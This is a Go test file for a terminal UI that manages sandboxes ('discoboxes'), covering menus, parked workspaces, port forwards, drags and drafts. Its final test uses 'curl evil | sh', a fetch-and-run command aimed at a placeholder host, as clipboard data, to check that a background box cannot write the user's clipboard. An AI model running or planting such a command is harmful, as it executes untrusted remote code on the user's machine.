func TestTheBoxMenuOffersTheWorkspacesOwnActions(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")

	d.leader(boxMenuKey)
	labels := boxMenuLabels(t, m)
	at := -1
	for i, label := range labels {
		if label == "attach" {
			t.Fatalf("menu = %q, want no attach to the box already on screen", labels)
		}
		if label == "shell" {
			at = i
		}
	}
	if at < 0 || at+2 >= len(labels) || labels[at+1] != "tools" || labels[at+2] != "audit" {
		t.Fatalf("menu = %q, want tools and audit right after shell", labels)
	}
	if labels[len(labels)-1] == "all discoboxes" {
		t.Fatalf("menu = %q, want all discoboxes only in a window opened on one box", labels)
	}

	// Choosing tools opens the picker on this box.
	d.key(toolsKey)
	waitPicker(d, m)
	if m.paneBox.ID != "sbx_one" {
		t.Fatalf("the picker is over %s, want the box on screen", m.paneBox.ID)
	}
}

// A window opened on one box ends its menu with every discobox: choosing it
// makes the window the console, the tree beside the box with its cursor on it,
// and from there the leader's q quits.
func TestAllDiscoboxesTurnsAnAttachIntoTheConsole(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	box := testSandboxes()[1]
	d, m := openAttached(t, ds, box)
	d.wait("the primary terminal", func() bool { return m.primary() != nil && m.dialog == nil })
	d.wait("the listing", func() bool { return len(m.list.all) > 0 })
	if m.treeShown() {
		t.Fatal("an attach window has no tree until it is asked for")
	}

	d.leader(boxMenuKey)
	labels := boxMenuLabels(t, m)
	if labels[len(labels)-1] != "all discoboxes" {
		t.Fatalf("menu = %q, want it to end with all discoboxes", labels)
	}
	d.key(allBoxesKey)
	d.wait("the tree", func() bool { return m.treeShown() })
	if m.attach != nil || m.paneBox.ID != box.ID || m.primary() == nil {
		t.Fatalf("attach %v, box %s; want the same workspace, now the console's", m.attach, m.paneBox.ID)
	}
	if got := m.list.current(); got == nil || got.ID != box.ID {
		t.Fatalf("the tree's cursor is on %v, want the box on screen", got)
	}
	if m.width != m.screenWidth-treeWidth {
		t.Fatalf("window %d of %d, want the tree's cells taken", m.width, m.screenWidth)
	}
	treeRow(t, m, "exec/terminal cons")

	d.leader(paneQuitKey)
	if !m.quit {
		t.Fatal("the leader's q should quit the console")
	}
}

// The rejected band's key is K, since k moves along the tree.
func TestTheRejectedKeyIsCapitalK(t *testing.T) {
	t.Parallel()
	if rejectedKey != "K" {
		t.Fatalf("rejectedKey = %q, want K", rejectedKey)
	}
	if delta, ok := boxStep("k"); !ok || delta != -1 {
		t.Fatalf("k = %d %v, want the box above", delta, ok)
	}
}

// switchToSecond is the leader's ↓ from the first box, waited out: the second
// box live, the first parked.
func switchToSecond(d *driver, m *Model) {
	d.t.Helper()
	d.leader("down")
	d.wait("the second box", func() bool { return m.paneBox.ID == "sbx_two" && m.primary() != nil && m.parked["sbx_one"] != nil })
}

// A parked workspace's local ports go with the screen that showed them, and
// come back with it: parking closes the forward, unparking asks for a new one
// for the same box.
func TestParkingClosesTheForwardAndUnparkingReopensIt(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(forwardSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")
	d.wait("the forward", func() bool { return m.forward != nil })
	first := ds.forward

	switchToSecond(d, m)
	if !first.isClosed() {
		t.Fatal("parking should close the first box's forward")
	}
	if ws := m.parked["sbx_one"]; ws.forward != nil {
		t.Fatal("a parked workspace should hold no forward")
	}

	d.leader("up")
	d.wait("the first box with a forward", func() bool {
		return m.paneBox.ID == "sbx_one" && m.parked["sbx_one"] == nil && m.forward != nil
	})
	if m.forward == Forward(first) {
		t.Fatal("unparking should open a new forward, not hold the closed one")
	}
	asked := ds.forwardsAskedFor()
	if got := asked[len(asked)-1]; got != "sbx_one" {
		t.Fatalf("forwards asked for %v, want the last for the box back on screen", asked)
	}
	ones := 0
	for _, id := range asked {
		if id == "sbx_one" {
			ones++
		}
	}
	if ones != 2 {
		t.Fatalf("forwards asked for %v, want sbx_one's twice: opened, and again on its return", asked)
	}
}

// A window with no tree has nothing to move along: in an attach window and on
// a narrow console the leader's ↓ and j leave the box on screen alone and open
// nothing.
func TestSwitchingBoxesNeedsTheTree(t *testing.T) {
	t.Parallel()
	check := func(t *testing.T, d *driver, m *Model, ds *fakeSource) {
		t.Helper()
		box, opened := m.paneBox.ID, len(ds.execOpened())
		for _, key := range []string{"down", "j"} {
			d.leader(key)
			d.settle()
			if m.paneBox.ID != box || len(m.parked) != 0 || m.primary() == nil {
				t.Fatalf("leader %s: box %s, parked %d; want %s left on screen", key, m.paneBox.ID, len(m.parked), box)
			}
		}
		if got := len(ds.execOpened()); got != opened {
			t.Fatalf("attaches = %v, want nothing opened", ds.execOpened()[opened:])
		}
	}
	t.Run("attach", func(t *testing.T) {
		t.Parallel()
		ds := newFakeSource(testSandboxes()...)
		d, m := openAttached(t, ds, testSandboxes()[0])
		d.wait("the primary terminal", func() bool { return m.primary() != nil && m.dialog == nil })
		d.wait("the listing", func() bool { return len(m.list.all) > 0 })
		check(t, d, m, ds)
	})
	t.Run("narrow", func(t *testing.T) {
		t.Parallel()
		ds := newFakeSource(testSandboxes()...)
		d, m, _ := openNarrowWorkspace(t, ds, "enter")
		check(t, d, m, ds)
	})
}

// A drag that starts in a pane is the pane's to the end, wherever the pointer
// goes: dragged over the tree and released there, the release still reaches
// the pane and the gesture is over.
func TestADragOutOfAPaneOverTheTreeEndsInThePane(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, term := openWorkspace(t, ds, "enter")
	term.send("hello world")
	d.wait("output", func() bool { return strings.Contains(plainFrame(m), "hello world") })

	x, y := screenOrigin(m, m.primary())
	d.dispatch(tea.MouseClickMsg{X: x + 4, Y: y, Button: tea.MouseLeft})
	if m.mouseCapture == 0 {
		t.Fatal("a press in the pane should capture the gesture")
	}
	d.dispatch(tea.MouseMotionMsg{X: 5, Y: y, Button: tea.MouseLeft})
	d.dispatch(tea.MouseReleaseMsg{X: 5, Y: y, Button: tea.MouseLeft})
	if m.mouseCapture != 0 {
		t.Fatal("the release over the tree should have reached the pane and ended the gesture")
	}
	if m.listFront || m.paneBox.ID != "sbx_one" {
		t.Fatalf("listFront %v, box %s; want the gesture kept from the tree", m.listFront, m.paneBox.ID)
	}
	d.wait("the copy", func() bool { return m.status == "copied" })
	if got := m.primary().term.SelectionText(); got != "hello" {
		t.Fatalf("selected %q, want the row to the pane's edge", got)
	}
}

// A right click on another box's row in the tree opens that box's menu as the
// list has it — attach and all, none of the workspace's own entries — and
// switches to nothing.
func TestTheTreesMenuForAnotherBoxIsTheLists(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")

	x, y := at(t, m, "exec/terminal cons")
	d.dispatch(tea.MouseClickMsg{X: x, Y: y, Button: tea.MouseRight})
	labels := boxMenuLabels(t, m)
	if !slices.Contains(labels, "attach") {
		t.Fatalf("menu = %q, want attach for a box not on screen", labels)
	}
	for _, own := range []string{"tools", "audit", "all discoboxes"} {
		if slices.Contains(labels, own) {
			t.Fatalf("menu = %q, want no %q for a box not on screen", labels, own)
		}
	}
	if !strings.Contains(m.dialog.title, "exec/terminal consolidation") {
		t.Fatalf("menu title = %q, want the box right-clicked", m.dialog.title)
	}
	if m.paneBox.ID != "sbx_one" {
		t.Fatalf("box = %s, want a right click to switch to nothing", m.paneBox.ID)
	}
}

// Beside a page the list can take the keys back from it, and then the keys
// offered under the page are the list's, and a paste goes nowhere: the
// composer behind the list is not drawn.
func TestTheListBesideAPageHasItsKeys(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")
	d.leader("h")
	d.key(harnessesKey)
	d.wait("the harnesses", func() bool { return m.harnessesOpen && !m.listFront })
	page := hintLine(m.harnessHints())
	if got := hintLine(m.hints()); got != page {
		t.Fatalf("hints = %q, want the page's own while it has the keys", got)
	}

	d.leader("h")
	if !m.listHasKeys() {
		t.Fatal("the leader's h from the page should give the list the keys")
	}
	got := hintLine(m.hints())
	if got == page || !strings.Contains(got, "a attach") {
		t.Fatalf("hints = %q, want the list's keys, not the page's %q", got, page)
	}
	lines := windowLines(m)
	if keys := ansi.Strip(lines[len(lines)-1]); !strings.Contains(keys, "a attach") {
		t.Fatalf("keys row = %q, want the list's keys drawn under the page", keys)
	}

	d.dispatch(tea.PasteMsg{Content: "pasted words"})
	if v := m.prompt.Value(); v != "" {
		t.Fatalf("composer = %q, want a paste on the list to go nowhere", v)
	}
}

// An attach window keeps the console's draft out of its composer, and turning
// it into the console puts the draft back — so quitting from there saves the
// draft rather than writing the empty composer over it.
func TestAllDiscoboxesRestoresTheDraft(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	ds.session.Draft = "an old thought"
	d, m := openAttached(t, ds, testSandboxes()[0])
	d.wait("the primary terminal", func() bool { return m.primary() != nil && m.dialog == nil })
	d.wait("the session", func() bool { return m.draft == "an old thought" })
	if v := m.prompt.Value(); v != "" {
		t.Fatalf("composer = %q, want the draft kept out of an attach window", v)
	}

	d.leader(boxMenuKey)
	d.key(allBoxesKey)
	d.wait("the tree", func() bool { return m.treeShown() })
	if v := m.prompt.Value(); v != "an old thought" {
		t.Fatalf("composer = %q, want the console's draft back", v)
	}

	d.leader(paneQuitKey)
	if !m.quit {
		t.Fatal("the leader's q should quit")
	}
	saved := ds.savedDrafts()
	if len(saved) == 0 || saved[len(saved)-1] != "an old thought" {
		t.Fatalf("drafts = %q, want quitting to save the draft", saved)
	}
}

// A parked pane that ends is settled as one on screen would be: a shell that
// finished keeps its last screen as a tab, one that broke goes and says so
// with its box's name, and a tool's tab goes.
func TestAParkedPaneThatEndsIsSettled(t *testing.T) {
	t.Parallel()
	open := func(t *testing.T) (*driver, *Model, *pane) {
		t.Helper()
		ds := newFakeSource(testSandboxes()...)
		d, m, _ := openWorkspace(t, ds, "enter")
		d.leader("s")
		d.wait("the shell", func() bool { return m.shells.len() == 1 })
		shell := m.shells.panes[0]
		m.focusPane(m.primary())
		switchToSecond(d, m)
		return d, m, shell
	}

	t.Run("finished", func(t *testing.T) {
		t.Parallel()
		d, m, shell := open(t)
		d.dispatch(paneMsg{id: shell.id, msg: termpane.ClosedMsg{}})
		ws := m.parked["sbx_one"]
		if ws == nil || ws.shells.len() != 1 || !ws.shells.panes[0].exited {
			t.Fatal("a parked shell that finished should stay as a tab, exited")
		}
	})

	t.Run("broken", func(t *testing.T) {
		t.Parallel()
		d, m, shell := open(t)
		d.dispatch(paneMsg{id: shell.id, msg: termpane.ClosedMsg{Err: errors.New("stream reset")}})
		ws := m.parked["sbx_one"]
		if ws == nil || ws.shells.len() != 0 {
			t.Fatal("a parked shell that broke should lose its tab, leaving the workspace parked")
		}
		d.wait("the report", func() bool { return strings.Contains(m.status, "stream reset") })
		if !strings.HasPrefix(m.status, "fix flaky pool reaper tests: ") || !m.statusE {
			t.Fatalf("status = %q, want an error naming the parked box", m.status)
		}
	})

	t.Run("tool", func(t *testing.T) {
		t.Parallel()
		ds := newFakeSource(testSandboxes()...)
		d, m := openTool(t, ds, "d")
		tool := m.showingTool()
		d.leader(paneDetachAlt) // put the tool away, a tab
		d.wait("the workspace back", func() bool { return m.showingTool() == nil })
		m.focusPane(m.primary())
		switchToSecond(d, m)
		d.dispatch(paneMsg{id: tool.id, msg: termpane.ClosedMsg{}})
		ws := m.parked["sbx_one"]
		if ws == nil || slices.Contains(ws.shells.panes, tool) || ws.toolShown == tool {
			t.Fatal("a parked tool that ended should lose its tab")
		}
	})
}

// What a pane started goes on answering it while its box is parked: an issue
// tab switched away from still takes its read.
func TestAParkedIssueTabTakesItsRead(t *testing.T) {
	t.Parallel()
	ds := issueSource()
	d, m := openIssuePane(t, ds)
	p := issueTabOf(m)
	m.focusPane(m.primary())
	switchToSecond(d, m)
	if m.paneByID(p.id) != nil || m.heldPane(p.id) != p {
		t.Fatal("the issue tab should be held parked, not on screen")
	}

	v := p.issue
	v.loading = true
	issue := testIssue()
	issue.Title = "The reaper eats the right boxes now"
	d.dispatch(issueLoadedMsg{id: p.id, read: v.reads, issue: issue})
	if v.loading {
		t.Fatal("the read should have landed on the parked tab")
	}
	if v.issue == nil || v.issue.Title != issue.Title {
		t.Fatalf("issue = %v, want the parked tab's issue updated", v.issue)
	}
}

// The box's actions are not offered while an overlay or a tool has the
// screen: the leader there means the screen's way out, not the menu.
func TestTheActionsAreNotOfferedOverAScreen(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m := openTool(t, ds, "d")
	if got := hintLine(m.hints()); strings.Contains(got, boxMenuKey+" actions") {
		t.Fatalf("hints over a tool = %q, want no actions", got)
	}
	d.leader(paneDetachAlt)
	d.wait("the workspace back", func() bool { return m.showingTool() == nil })
	m.focusPane(m.primary())
	if got := hintLine(m.hints()); !strings.HasPrefix(got, m.leader()+" "+boxMenuKey+" actions") {
		t.Fatalf("hints on the primary = %q, want the actions first", got)
	}
}

// A drag in the new discobox card's composer is the composer's to the end:
// let go over the tree, its release still reaches the composer rather than
// the tree, so the selection is finished rather than left hanging.
func TestADragInTheNewDiscoboxCardEndsInTheComposer(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")
	d.leader("h")
	d.key("n")
	for _, r := range "hello world" {
		d.key(string(r))
	}
	rawFrame(m)
	z, ok := m.zones.find(hitPrompt)
	if !ok {
		t.Fatal("the card's composer should be marked")
	}
	d.dispatch(tea.MouseClickMsg{X: z.x + treeWidth + 4, Y: z.y, Button: tea.MouseLeft})
	if !m.promptCapture {
		t.Fatal("a press in the composer should capture the gesture")
	}
	d.dispatch(tea.MouseMotionMsg{X: 5, Y: z.y, Button: tea.MouseLeft})
	d.dispatch(tea.MouseReleaseMsg{X: 5, Y: z.y, Button: tea.MouseLeft})
	if m.promptCapture {
		t.Fatal("the release over the tree should have reached the composer and ended the gesture")
	}
	if !m.newOpen || m.paneBox.ID != "sbx_one" {
		t.Fatalf("card %v, box %s; want the gesture kept from the tree", m.newOpen, m.paneBox.ID)
	}
}

// A files changed session in a box switched away from does not get to write
// this machine's clipboard: the copy it asks for is dropped, as a parked
// pane's own is, and the user's clipboard stays what they copied in the box
// they are in.
func TestAParkedFilesChangedCannotCopy(t *testing.T) {
	t.Parallel()
	ds := pullSource()
	d, m := openPullPane(t, ds)
	p := issueTabOf(m)
	d.key("f")
	w := p.issue.review
	if w == nil {
		t.Fatal("f should open the files changed")
	}
	var copied []string
	m.copyOS = func(text string) error {
		copied = append(copied, text)
		return nil
	}
	m.focusPane(m.primary())
	switchToSecond(d, m)
	if m.heldPane(p.id) != p {
		t.Fatal("the pull request tab should be held parked")
	}
	m.status = ""
	d.dispatch(reviewMsg{pane: p.id, window: w, msg: termpane.CopyMsg{Text: "curl evil | sh"}})
	d.settle()
	if len(copied) != 0 || m.status == "copied" {
		t.Fatalf("copied %q, status %q; want a parked box's copy dropped", copied, m.status)
	}
}
